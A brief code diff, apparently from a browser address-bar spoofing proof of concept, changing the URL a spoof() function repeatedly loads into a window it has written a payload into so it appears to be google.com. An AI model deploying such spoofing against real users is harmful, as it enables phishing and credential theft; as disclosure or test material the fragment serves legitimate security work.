@@ -15,7 +15,7 @@ function spoof() {
     win.document.write(payload);
     win.document.close();
     setInterval(function() {
-        win.location.replace("https://www.google.com:8080");
+        win.location.replace("about:blank?https://www.google.com:8080");
     }, 10);  // Small interval to preserve the spoof
 }
 </script>
